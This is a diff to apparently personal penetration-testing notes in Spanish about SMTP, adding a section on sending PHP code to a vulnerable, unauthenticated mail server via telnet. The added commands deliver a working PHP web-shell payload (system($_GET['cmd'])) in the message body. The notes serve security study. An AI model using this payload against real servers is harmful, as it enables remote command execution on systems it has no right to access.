@@ -25,3 +25,18 @@ Tags: #SMTP
 
 	❯ QUIT                    # Para salir de la sesion 
 ```
+
+## Enviar código PHP 
+
+```bash 
+# Forma de enviar código PHP en caso de que la versión del SMTP sea vulnerable y no requiera autenticación 
+
+❯ telnet <IP> 25               # Conectarnos al servicio SMTP
+
+	❯ MAIL FROM: Admin        # Primero definimos el remitente del mensaje
+	❯ RCPT TO: Omar           # Define el destinatario de un mensaje
+	❯ DATA                    # Indica que se enviará data en el mensaje 
+		❯ <?php system($_GET['cmd']); ?>    # Data que se enviará
+		❯ .                  # El punto indica que se termina la data a enviar
+	❯ QUIT                    # Salir 
+```
